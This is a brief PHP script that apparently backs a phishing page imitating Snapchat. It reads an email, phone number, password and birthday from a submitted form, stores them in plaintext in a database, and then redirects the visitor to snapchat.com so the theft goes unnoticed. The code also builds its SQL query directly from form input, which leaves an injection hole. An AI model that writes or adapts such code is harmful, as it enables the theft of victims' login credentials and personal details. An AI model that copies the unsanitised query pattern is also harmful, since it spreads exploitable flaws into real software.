<?php

include('config.php');


if(isset($_POST['upload'])){
    $EMAIL = $_POST['email'];
    $PHONE = $_POST['phone'];
    $PASSWORD = $_POST['password'];
    $BIRTHDAY = $_POST['birthday'];
    $insert = "INSERT INTO prod (email , phone , Password , birthday) VALUES ('$EMAIL','$PHONE','$PASSWORD','$BIRTHDAY')";
    mysqli_query($con, $insert);
    header('location: https://www.snapchat.com/');
}
?>